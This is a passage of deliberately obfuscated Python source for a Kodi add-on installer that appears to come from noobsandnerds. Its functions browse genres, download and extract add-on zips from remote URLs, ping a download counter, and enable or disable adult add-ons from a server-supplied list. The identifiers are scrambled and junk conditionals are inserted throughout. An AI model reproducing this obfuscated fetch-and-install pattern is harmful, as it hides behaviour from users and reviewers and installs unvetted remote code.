 Ii1I1Ii ( 'folder' , 'Health' , url + '&genre=health' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'How To...' , url + '&genre=howto' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Kids' , url + '&genre=kids' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Live TV' , url + '&genre=livetv' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Movies' , url + '&genre=movies' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Music' , url + '&genre=music' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'News' , url + '&genre=news' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Photos' , url + '&genre=photos' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Podcasts' , url + '&genre=podcasts' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Radio' , url + '&genre=radio' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Religion' , url + '&genre=religion' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Space' , url + '&genre=space' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Sports' , url + '&genre=sports' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Subscription' , url + '&genre=subscription' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Technology' , url + '&genre=tech' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Trailers' , url + '&genre=trailers' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'TV Shows' , url + '&genre=tv' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Misc.' , url + '&genre=other' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 if 91 - 91: ooOo + I1IiiI
 if o0O . getSetting ( 'adult' ) == 'true' :
  Ii1I1Ii ( 'folder' , 'XXX' , url + '&genre=adult' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
  if 59 - 59: I1IiiI + i11iIiiIii + i1IIi / OOOoOoo0O
  if 44 - 44: OOOoOoo0O . OoOoOO00 * I1IiiI + OoooooooOO - IIiIi1iI - IIiiiI1iIII
def I1iiioOO0OO0O ( name , zip_link , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 forum = str ( forum )
 repo_id = str ( repo_id )
 o00o = 1
 III11I = 1
 Ii1I11I = 1
 iiIii1I = xbmc . translatePath ( os . path . join ( II11iiii1Ii , addon_id ) )
 if 47 - 47: iiiiiiii1 . OOOoOoo0O / o0oOOo0O0Ooo
 if os . path . exists ( iiIii1I ) :
  OOoOO = 1
  if 66 - 66: Oo0Ooo - o0oOOo0O0Ooo * IIiiiI1iIII + OoOoOO00 + o0oOOo0O0Ooo - iIii1I11I1II1
 else :
  OOoOO = 0
  if 17 - 17: ooOo
 i1ii11 = xbmc . translatePath ( os . path . join ( OOO00O , name + '.zip' ) )
 ii1i = xbmc . translatePath ( os . path . join ( II11iiii1Ii , addon_id ) )
 if 5 - 5: ooOo . I1ii11iIi11i . II111iiii . OoooooooOO
 OOooO0OOoo . create ( "Installing Addon" , "Please wait whilst your addon is installed" , '' , '' )
 if 96 - 96: i11iIiiIii - Oo % O0 / OoO0O00
 try :
  downloader . download ( repo_link , i1ii11 , OOooO0OOoo )
  extract . all ( i1ii11 , II11iiii1Ii , OOooO0OOoo )
  if 100 - 100: IIiIi1iI / O00OOo00oo0o - OoooooooOO % II111iiii - I1IiiI % OoOoOO00
 except :
  if 60 - 60: iIii1I11I1II1 + i1IIi
  try :
   downloader . download ( zip_link , i1ii11 , OOooO0OOoo )
   extract . all ( i1ii11 , II11iiii1Ii , OOooO0OOoo )
   if 86 - 86: iIii1I11I1II1 + OoOoOO00 . i11iIiiIii - O00OOo00oo0o
  except :
   if 51 - 51: OoOoOO00
   try :
    if not os . path . exists ( ii1i ) :
     os . makedirs ( ii1i )
     if 14 - 14: IIiiiI1iIII % ooOo % Oo0Ooo - i11iIiiIii
    O0OoooO0 = ooo0O0o00O ( data_path , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    o0OO000ooOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( O0OoooO0 )
    if 86 - 86: OoO0O00 * OoooooooOO
    for OooO0oOo in o0OO000ooOo :
     oOOo00O0OOOo = xbmc . translatePath ( os . path . join ( ii1i , OooO0oOo ) )
     if 31 - 31: OOOoOoo0O % Oo * OOOoOoo0O
     if addon_id not in OooO0oOo and '/' not in OooO0oOo :
      if 45 - 45: i1IIi . I1IiiI + Oo - OoooooooOO % iiiiiiii1
      try :
       OOooO0OOoo . update ( 0 , "Downloading [COLOR=yellow]" + OooO0oOo + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( data_path + OooO0oOo , oOOo00O0OOOo , OOooO0OOoo )
       if 1 - 1: iIii1I11I1II1
      except :
       print "failed to install" + OooO0oOo
       if 93 - 93: i1IIi . i11iIiiIii . Oo0Ooo
     if '/' in OooO0oOo and '..' not in OooO0oOo and 'http' not in OooO0oOo :
      O0O00OOo = data_path + OooO0oOo
      OoOOo ( oOOo00O0OOOo , O0O00OOo )
      if 17 - 17: i1IIi
   except :
    iI111I11I1I1 . ok ( "Error downloading add-on" , 'There was an error downloading [COLOR=yellow]' + name , '[/COLOR]Please consider updating the add-on portal with details or report the error on the forum at WWW.NOOBSANDNERDS.COM' )
    o00o = 0
    if 1 - 1: iiiiiiii1
 if o00o == 1 :
  time . sleep ( 1 )
  OOooO0OOoo . update ( 0 , "[COLOR=yellow]" + name + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing repository' )
  time . sleep ( 1 )
  oOO0oo = xbmc . translatePath ( os . path . join ( II11iiii1Ii , repo_id ) )
  if 29 - 29: I1IiiI * II111iiii * OoooooooOO - I1ii11iIi11i * II111iiii
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( oOO0oo ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   ii ( repo_id )
   if 95 - 95: IIiiiI1iIII * I1ii11iIi11i % iiiiiiii1 % O00OOo00oo0o - O00OOo00oo0o
  xbmc . sleep ( 2000 )
  if 97 - 97: I1ii11iIi11i + iIii1I11I1II1 . O0
  if os . path . exists ( iiIii1I ) and OOoOO == 0 :
   Ooo0Oo0oo0 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   try :
    ooo0O0o00O ( Ooo0Oo0oo0 )
   except :
    pass
    if 83 - 83: IIi
  ii111Ii11iii ( name , addon_id )
  iiIiii1IIIII ( showdialog = False )
  xbmc . executebuiltin ( 'Container.Refresh' )
  if 62 - 62: iIii1I11I1II1
  if III11I == 0 :
   iI111I11I1I1 . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing the repository.' , 'This will mean the add-on fails to update' )
   if 93 - 93: ooOo - o0oOOo0O0Ooo % OoOoOO00 . OoOoOO00 - iiiiiiii1
  if Ii1I11I == 0 :
   iI111I11I1I1 . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing modules.' , 'This could result in errors with the add-on.' )
   if 90 - 90: iiiiiiii1 + II111iiii * I1ii11iIi11i / O00OOo00oo0o . o0oOOo0O0Ooo + o0oOOo0O0Ooo
  if Ii1I11I != 0 and III11I != 0 and forum != 'None' :
   iI111I11I1I1 . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]Support for this add-on can be found at [COLOR=yellow]' + forum , '[/COLOR][CR]Visit WWW.NOOBSANDNERDS.COM for all your Kodi needs.' )
   if 40 - 40: iiiiiiii1 / OoOoOO00 % i11iIiiIii % I1ii11iIi11i / I1IiiI
  if Ii1I11I != 0 and III11I != 0 and forum == 'None' :
   iI111I11I1I1 . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]No details of forum support have been given.' )
   if 62 - 62: i1IIi - OoOoOO00
   if 62 - 62: i1IIi + Oo0Ooo % IIiiiI1iIII
def iIi ( addon_id ) :
 try :
  xbmcaddon . Addon ( id = addon_id ) . getAddonInfo ( 'path' )
  return True
 except :
  return False
  if 10 - 10: OoO0O00 / Oo0Ooo
  if 15 - 15: IIiIi1iI . OoOoOO00 / IIiIi1iI * OOOoOoo0O - I1IiiI % I1ii11iIi11i
def oo0OOOOOO0 ( addon_id ) :
 Ooo0Oo0oo0 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
 try :
  ooo0O0o00O ( Ooo0Oo0oo0 , 10 )
 except :
  pass
  if 26 - 26: iIii1I11I1II1
  if 87 - 87: I1ii11iIi11i / OoooooooOO - Oo0Ooo % OoOoOO00 % IIiiiI1iIII % Oo0Ooo
def Ii1 ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 if 34 - 34: IIiIi1iI - OoooooooOO . I1IiiI / II111iiii
 if 27 - 27: OoO0O00 / Oo0Ooo * iiiiiiii1 - OoO0O00
 if iIi ( repo_id ) and not iIi ( addon_id ) :
  xbmc . log ( 'Repo exists: %s' % repo_id )
  xbmc . executebuiltin ( 'XBMC.RunPlugin(plugin://%s)' % addon_id )
  if 19 - 19: OOOoOoo0O
  if 67 - 67: O0 % iIii1I11I1II1 / IIiiiI1iIII . i11iIiiIii - O00OOo00oo0o + O0
  i1iiiIi1i = threading . Thread ( target = OO0Oo , args = [ 'yesnodialog' ] )
  i1iiiIi1i . start ( )
  IiIIIIIIiI = True
  OOooo00 = 0
  while IiIIIIIIiI and OOooo00 < 20 :
   xbmc . sleep ( 500 )
   OOooo00 += 1
   IiIIIIIIiI = i1iiiIi1i . isAlive ( )
   if 35 - 35: IIi . OoOoOO00 * i11iIiiIii
   if 44 - 44: i11iIiiIii / Oo0Ooo
  if OO0Oo ( 'okdialog' ) :
   xbmc . log ( '### Kodi failed to install add-on' )
   return
   if 42 - 42: OoooooooOO + Oo0Ooo % II111iiii + OoO0O00
   if 24 - 24: IIiIi1iI * II111iiii % IIiIi1iI % IIiiiI1iIII + OoooooooOO
  i1iiiIi1i = threading . Thread ( target = OO0Oo , args = [ 'progressdialog' ] )
  i1iiiIi1i . start ( )
  IiIIIIIIiI = True
  OOooo00 = 0
  while IiIIIIIIiI and OOooo00 < 40 :
   xbmc . sleep ( 500 )
   OOooo00 += 1
   IiIIIIIIiI = i1iiiIi1i . isAlive ( )
  if iIi ( addon_id ) :
   oo0OOOOOO0 ( addon_id )
   xbmc . executebuiltin ( 'Container.Refresh' )
   if 29 - 29: II111iiii - OoooooooOO - i11iIiiIii . o0oOOo0O0Ooo
   if 19 - 19: II111iiii
  else :
   iI111I11I1I1 . ok ( 'UNABLE TO INSTALL' , 'The most common cause for this is the add-on is no longer available on the repo. If you find an alternative repo that has it please consider updating the team at noobsandnerds.com so they can fix in the database.' )
   if 72 - 72: OoooooooOO / I1IiiI + O00OOo00oo0o / OoOoOO00 * O00OOo00oo0o
   if 34 - 34: O0 * O0 % OoooooooOO + IIiIi1iI * iIii1I11I1II1 % O00OOo00oo0o
 elif iIi ( addon_id ) :
  if iI111I11I1I1 . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' ) :
   iiIii1I = xbmcaddon . Addon ( id = addon_id ) . getAddonInfo ( 'path' )
   if 25 - 25: OOOoOoo0O + OoOoOO00 . o0oOOo0O0Ooo % OoOoOO00 * Oo
   try :
    shutil . rmtree ( iiIii1I )
   except :
    xbmc . log ( 'Failed to remove %s' % iiIii1I )
    if 32 - 32: i11iIiiIii - IIi
   OooooOOoo0 = open ( OOoOO0oo0ooO , 'w' )
   OooooOOoo0 . write ( 'import default;default.Update_Repo(showdialog = False);xbmc.sleep(1500);default.Addon_Install_Zero("%s","%s","%s","%s","%s","%s","%s","%s")' % ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) )
   OooooOOoo0 . close ( )
   if 53 - 53: OoooooooOO - IIiiiI1iIII
   oOoi1i = xbmc . getInfoLabel ( 'System.ProfileName' )
   xbmc . log ( '### attempting to load profile: %s' % oOoi1i )
   xbmc . executebuiltin ( 'LoadProfile(%s)' % oOoi1i )
   return
   if 5 - 5: I1ii11iIi11i + O0 + O0 . IIi - iiiiiiii1
  else :
   return
   if 63 - 63: ooOo
 elif ( repo_id != 'repository.xbmc.org' ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
  Oo0 = ii ( repo_id )
  xbmc . log ( '### repo installed, sleeping for 2000' )
  xbmc . sleep ( 2000 )
  if Oo0 :
   xbmc . log ( '### running plugin' )
   xbmc . executebuiltin ( 'XBMC.RunPlugin(plugin://%s)' % addon_id )
   xbmc . log ( '### running yesno window check' )
   if 79 - 79: OoO0O00 % Oo / iIii1I11I1II1 + OoOoOO00 * OoO0O00
   i1iiiIi1i = threading . Thread ( target = OO0Oo , args = [ 'yesnodialog' ] )
   i1iiiIi1i . start ( )
   IiIIIIIIiI = True
   OOooo00 = 0
   while IiIIIIIIiI and OOooo00 < 20 :
    xbmc . sleep ( 500 )
    OOooo00 += 1
    IiIIIIIIiI = i1iiiIi1i . isAlive ( )
   xbmc . log ( '### yesno status: %s' % IiIIIIIIiI )
   if 30 - 30: OoooooooOO / OOOoOoo0O + IIiIi1iI / I1ii11iIi11i * O0
   if globalyesno :
    xbmc . log ( '### yes/no was true, checking progressdialog' )
    iIiII = threading . Thread ( target = OO0Oo , args = [ 'progressdialog' ] )
    iIiII . start ( )
    IiIIIIIIiI = True
    OOooo00 = 0
    while IiIIIIIIiI and OOooo00 < 40 :
     xbmc . sleep ( 500 )
     OOooo00 += 1
     IiIIIIIIiI = iIiII . isAlive ( )
    xbmc . log ( '### progressdialog status: %s' % i1iiiIi1i )
    if iIi ( addon_id ) :
     oo0OOOOOO0 ( addon_id )
     xbmc . executebuiltin ( 'Container.Refresh' )
    OOooO0OOoo . close ( )
    if 19 - 19: IIiiiI1iIII
   else :
    iI111I11I1I1 . ok ( 'UNABLE TO INSTALL' , 'The most common cause for this is the add-on is no longer available on the repo. If you find an alternative repo that has it please consider updating the team at noobsandnerds.com so they can fix in the database.' )
  else :
   iI111I11I1I1 . ok ( 'Failed Install' , 'The repository could not be installed, the developer may have deleted it. Please try the backup install option.' )
 try :
  os . path . remove ( OOoOO0oo0ooO )
 except :
  pass
  if 78 - 78: Oo % o0oOOo0O0Ooo
  if 39 - 39: I1ii11iIi11i + I1IiiI - iIii1I11I1II1 - o0oOOo0O0Ooo
def I1ii1II1iII ( sign ) :
 Ii1I1Ii ( 'folder' , '[COLOR=gold]Popular[/COLOR] (Show the top 100 most downloaded add-ons)' , 'popular' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=gold]Brand New[/COLOR] (Show the new releases)' , 'latest' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=gold]Manual Search[/COLOR] (Type in author/name/content)' , 'desc=' , 'search_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Filter Results (By Genres)' , 'p' , 'addon_genres' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Filter Results (By Countries)' , 'p' , 'addon_countries' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Filter Results (By Kodi Categories)' , 'p' , 'addon_categories' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Kodi Add-on Browser (Install From Zip)' , '' , 'install_from_zip' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Kodi Add-on Browser (Browse My Repositories)' , '' , 'browse_repos' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Kodi Add-on Browser (Check For Add-on Updates)' , '' , 'check_updates' , 'mainmenu/addons.png' , '' , '' , '' )
 if 8 - 8: OoOoOO00 / O0 * O0 % IIi - Oo0Ooo + OOOoOoo0O
 if 83 - 83: O0 . I1IiiI
def O0OIIi1 ( ) :
 iIII1iiII = [ ]
 IIi1iI1 = [ ]
 IIi11i1II = [ ]
 OO0ooo0o0 = [ ]
 oO0ooOoO = [ ]
 if 59 - 59: O0 % Oo0Ooo
 for file in os . listdir ( II11iiii1Ii ) :
  if os . path . isdir ( os . path . join ( II11iiii1Ii , file ) ) and os . path . exists ( os . path . join ( II11iiii1Ii , file , 'addon.xml' ) ) :
   if 92 - 92: O00OOo00oo0o % IIiIi1iI / I1ii11iIi11i % I1ii11iIi11i * I1IiiI
   if 74 - 74: O0 . I1IiiI % OoO0O00 % IIiiiI1iIII
   IIiIiI = open ( os . path . join ( II11iiii1Ii , file , 'addon.xml' ) , 'r' )
   ii1I1 = IIiIiI . read ( )
   IIiIiI . close ( )
   oOo0OooOo = re . compile ( 'id="(.+?)"' ) . findall ( ii1I1 ) [ 0 ]
   if 51 - 51: OOOoOoo0O . Oo0Ooo
   try :
    IiiIiiIi = xbmcaddon . Addon ( oOo0OooOo )
    i1iiIIIi = IiiIiiIi . getAddonInfo ( 'type' ) . replace ( 'xbmc.' , '' )
    ooo0O = IiiIiiIi . getAddonInfo ( 'name' )
    Oo0o = IiiIiiIi . getAddonInfo ( 'icon' )
    O00Oo = IiiIiiIi . getAddonInfo ( 'description' )
    oOOo00O0OOOo = os . path . join ( II11iiii1Ii , file )
    if 93 - 93: Oo
    iIII1iiII . append ( '[COLOR=gold]%s:[/COLOR]  %s' % ( i1iiIIIi , ooo0O ) )
    IIi1iI1 . append ( Oo0o )
    IIi11i1II . append ( O00Oo )
    OO0ooo0o0 . append ( oOOo00O0OOOo )
    if 43 - 43: I1ii11iIi11i / I1IiiI . iiiiiiii1
   except :
    xbmc . log ( '### Add-on Disabled, cannot remove until reactivated: %s' % file )
    if 62 - 62: iIii1I11I1II1 + IIiIi1iI . Oo0Ooo / IIiiiI1iIII % O0 . IIi
 Oo0oOooOoOo = I1iOo ( 'Add-ons To Fully Remove' , iIII1iiII , IIi1iI1 , IIi11i1II )
 for i1II1 in Oo0oOooOoOo :
  IiIiIi1I1 = OO0ooo0o0 [ i1II1 ]
  IiI1ii1Ii = iIII1iiII [ i1II1 ]
  oO0ooOoO . append ( [ IiI1ii1Ii , IiIiIi1I1 ] )
 if len ( oO0ooOoO ) > 0 :
  oooOOOoOOOo0O ( oO0ooOoO )
  if 82 - 82: IIiiiI1iIII * i11iIiiIii % II111iiii - OoooooooOO
  if 90 - 90: Oo0Ooo . ooOo * i1IIi - i1IIi
def IiIiiI11i1Ii ( ) :
 o0O . openSettings ( sys . argv [ 0 ] )
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 100 - 100: IIi . I1IiiI * IIi - I1IiiI . OOOoOoo0O * O00OOo00oo0o
 if 89 - 89: OoO0O00 + IIiiiI1iIII * IIi
def Ii1ooo0O0OO ( value ) :
 O0Oooo = ooo0O0o00O ( 'http://noobsandnerds.com/TI/AddonPortal/adult.php' , 10 )
 oO000 = re . compile ( 'i="(.+?)"' ) . findall ( O0Oooo )
 if 7 - 7: IIiiiI1iIII * I1IiiI + i1IIi + i11iIiiIii + Oo0Ooo % I1IiiI
 for i11i1iiiII in oO000 :
  i11i1iiiII = '"%s"' % i11i1iiiII
  OO00OO0o0 = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}, "id":1}' % ( i11i1iiiII , value )
  oOOOooOo0O = xbmc . executeJSONRPC ( OO00OO0o0 )
  xbmc . log ( OO00OO0o0 )
  xbmc . log ( '### RETURN %s' % oOOOooOo0O )
  if 43 - 43: o0oOOo0O0Ooo . IIiIi1iI . OOOoOoo0O + iIii1I11I1II1
 if value == 'false' :
  OoOOoO0oOo = 'disabled'
 else :
  OoOOoO0oOo = 'enabled'
 iI111I11I1I1 . ok ( 'ADULT CONTENT %s' % OoOOoO0oOo . upper ( ) , 'Your adult rated add-ons have now been %s' % OoOOoO0oOo )
 if 70 - 70: OOOoOoo0O % iIii1I11I1II1 . Oo0Ooo + Oo0Ooo - o0oOOo0O0Ooo % IIi
def i1IIi1i1Ii1 ( ) :
 ii1I1 = Iiio0Oo0oO ( )
 iIII1iiIi11 = re . compile ( 'External storage path = (.+?);' ) . findall ( ii1I1 )
 iIII1iiIi11 = iIII1iiIi11 [ 0 ] if ( len ( iIII1iiIi11 ) > 0 ) else ''
 return iIII1iiIi11
 if 84 - 84: i11iIiiIii * OoO0O00
 if 18 - 18: Oo - O00OOo00oo0o - OoOoOO00 / IIi - O0
def iiIIii ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 oO0Oo0O0 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 I1iIiI1IiIIII = len ( sourcefile )
 I1iiIi111I = [ ]
 Iiii1iIii = [ ]
 if 69 - 69: ooOo % OoooooooOO . I1IiiI
 OOooO0OOoo . create ( message_header , message1 , message2 , message3 )
 if 34 - 34: O00OOo00oo0o * OoOoOO00 - IIiiiI1iIII - I1IiiI - O00OOo00oo0o
 for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( sourcefile ) :
  if 79 - 79: OoO0O00 * OoOoOO00 . OoooooooOO - OOOoOoo0O * o0oOOo0O0Ooo
  for file in iiI1iii :
   Iiii1iIii . append ( file )
   if 78 - 78: IIiiiI1iIII
 Oo0O0Oo00O = len ( Iiii1iIii )
 if 9 - 9: o0oOOo0O0Ooo . I1IiiI - I1ii11iIi11i
 for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( sourcefile ) :
  if 32 - 32: OoooooooOO / I1IiiI / iIii1I11I1II1 + II111iiii . ooOo . o0oOOo0O0Ooo
  I1III111i [ : ] = [ ii1ii for ii1ii in I1III111i if ii1ii not in exclude_dirs ]
  iiI1iii [ : ] = [ IIiI1i for IIiI1i in iiI1iii if IIiI1i not in exclude_files and not 'crashlog' in IIiI1i and not 'stacktrace' in IIiI1i ]
  if 6 - 6: I1ii11iIi11i / IIiIi1iI - Oo
  for file in iiI1iii :
   if 62 - 62: OOOoOoo0O % Oo
   try :
    I1iiIi111I . append ( file )
    OOo00OO00Oo = len ( I1iiIi111I ) / float ( Oo0O0Oo00O ) * 100
    OOooO0OOoo . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % ii1ii , 'Please Wait' )
    I1I1I11Ii = os . path . join ( Ii1iIi111I1i , file )
    if 48 - 48: OoooooooOO + ooOo % iIii1I11I1II1
   except :
    print "Unable to backup file: " + file
    if 11 - 11: I1IiiI % O00OOo00oo0o - OoO0O00 - ooOo + o0oOOo0O0Ooo
   if not 'temp' in I1III111i :
    if 98 - 98: IIiIi1iI + O00OOo00oo0o - OoO0O00
    if not I1IiI in I1III111i :
     if 79 - 79: Oo / IIi . OoOoOO00 - I1ii11iIi11i
     try :
      Ii1ii11IIIi = '01/01/1980'
      OOoooOOOo0oO = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( I1I1I11Ii ) ) )
      if 92 - 92: OoO0O00 * iiiiiiii1
      if OOoooOOOo0oO > Ii1ii11IIIi :
       oO0Oo0O0 . write ( I1I1I11Ii , I1I1I11Ii [ I1iIiI1IiIIII : ] )
       if 35 - 35: i11iIiiIii
     except :
      print "Unable to backup file: " + file
      if 99 - 99: II111iiii . o0oOOo0O0Ooo + O0
 oO0Oo0O0 . close ( )
 OOooO0OOoo . close ( )
 if 71 - 71: IIiiiI1iIII + i1IIi * Oo0Ooo % Oo0Ooo / Oo0Ooo
 if 55 - 55: OoooooooOO + IIi + OoooooooOO * iiiiiiii1
def oo ( sourcefile , destfile ) :
 oO0Oo0O0 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 I1iIiI1IiIIII = len ( sourcefile )
 I1iiIi111I = [ ]
 Iiii1iIii = [ ]
 if 73 - 73: iiiiiiii1 + ooOo . OoO0O00
 OOooO0OOoo . create ( "Backing Up Files" , "Archiving..." , '' , 'Please Wait' )
 if 46 - 46: OoO0O00 - o0oOOo0O0Ooo / OoOoOO00 - OoooooooOO + ooOo
 for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( sourcefile ) :
  if 58 - 58: o0oOOo0O0Ooo / o0oOOo0O0Ooo + iiiiiiii1 + OOOoOoo0O - OoOoOO00 . Oo
  for file in iiI1iii :
   Iiii1iIii . append ( file )
   if 15 - 15: iiiiiiii1 * OoOoOO00 % IIiiiI1iIII . OoOoOO00 . OOOoOoo0O
 Oo0O0Oo00O = len ( Iiii1iIii )
 if 97 - 97: ooOo
 for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( sourcefile ) :
  if 80 - 80: I1IiiI . O00OOo00oo0o
  for file in iiI1iii :
   I1iiIi111I . append ( file )
   OOo00OO00Oo = len ( I1iiIi111I ) / float ( Oo0O0Oo00O ) * 100
   OOooO0OOoo . update ( int ( OOo00OO00Oo ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   I1I1I11Ii = os . path . join ( Ii1iIi111I1i , file )
   if 47 - 47: OOOoOoo0O + iiiiiiii1 + II111iiii % i11iIiiIii
   if not 'temp' in I1III111i :
    if 93 - 93: I1ii11iIi11i % OoOoOO00 . O0 / IIiIi1iI * ooOo
    if not I1IiI in I1III111i :
     if 29 - 29: o0oOOo0O0Ooo
     import time
     Ii1ii11IIIi = '01/01/1980'
     OOoooOOOo0oO = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( I1I1I11Ii ) ) )
     if 86 - 86: II111iiii . IIiiiI1iIII
     if OOoooOOOo0oO > Ii1ii11IIIi :
      oO0Oo0O0 . write ( I1I1I11Ii , I1I1I11Ii [ I1iIiI1IiIIII : ] )
 oO0Oo0O0 . close ( )
 OOooO0OOoo . close ( )
 if 2 - 2: OoooooooOO
 if 60 - 60: OoO0O00
def oO00Ooo0oO ( ) :
 OOOo = iI111I11I1I1 . browse ( 3 , 'Select the folder you want to scan' , 'files' , '' , False , False )
 I1iIiI1IiIIII = len ( OOOo )
 I1iiIi111I = [ ]
 Iiii1iIii = [ ]
 if 74 - 74: O00OOo00oo0o - OoooooooOO . Oo0Ooo
 OOooO0OOoo . create ( 'Checking File Structure' , '' , 'Please wait...' , '' )
 if 31 - 31: o0oOOo0O0Ooo % OOOoOoo0O + iIii1I11I1II1 + i11iIiiIii * IIi
 I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'Delete or Scan?' , 'Do you want to delete all filenames with special characters or would you rather just scan and view the results in the log?' , yeslabel = 'Delete' , nolabel = 'Scan' )
 if 40 - 40: OOOoOoo0O % OoooooooOO - Oo + o0oOOo0O0Ooo / Oo
 ooOiii1 = open ( oo0OooOOo0 , mode = 'w+' )
 OO0o0oO0O000o = open ( o0OO00oO , mode = 'w+' )
 if 47 - 47: IIi - OoO0O00 / O00OOo00oo0o * OoooooooOO / O00OOo00oo0o . Oo0Ooo
 for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( OOOo ) :
  if 34 - 34: iiiiiiii1
  for file in iiI1iii :
   Iiii1iIii . append ( file )
   if 27 - 27: IIi + OoooooooOO - OoOoOO00
 Oo0O0Oo00O = len ( Iiii1iIii )
 if 15 - 15: ooOo / OOOoOoo0O * O0 . II111iiii - OoO0O00
 for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( OOOo ) :
  if 90 - 90: ooOo
  I1III111i [ : ] = [ ii1ii for ii1ii in I1III111i ]
  iiI1iii [ : ] = [ IIiI1i for IIiI1i in iiI1iii ]
  if 94 - 94: OOOoOoo0O / I1ii11iIi11i * IIi - OoOoOO00
  for file in iiI1iii :
   if 44 - 44: O00OOo00oo0o % i11iIiiIii - IIiIi1iI * I1ii11iIi11i + Oo0Ooo * Oo
   I1iiIi111I . append ( file )
   OOo00OO00Oo = len ( I1iiIi111I ) / float ( Oo0O0Oo00O ) * 100
   OOooO0OOoo . update ( 0 , "Checking for non ASCII files" , '[COLOR yellow]%s[/COLOR]' % ii1ii , 'Please Wait' )
   if 41 - 41: O0 * iiiiiiii1 - OoOoOO00 . O00OOo00oo0o
   try :
    file . encode ( 'ascii' )
    if 65 - 65: Oo0Ooo . OoooooooOO
   except UnicodeDecodeError :
    OOoO0oo0O = ( str ( Ii1iIi111I1i ) + '/' + str ( file ) ) . replace ( '\\' , '/' ) . replace ( ':/' , ':\\' )
    if 49 - 49: o0oOOo0O0Ooo
    print " non-ASCII file status logged successfully: " + OOoO0oo0O
    if I1i1I1I11IiiI != 1 :
     ooOiii1 . write ( '[COLOR=dodgerblue]Non-ASCII File:[/COLOR]\n' )
     for II1ii1ii11I1 in o0ooOO0o ( OOoO0oo0O , 75 ) :
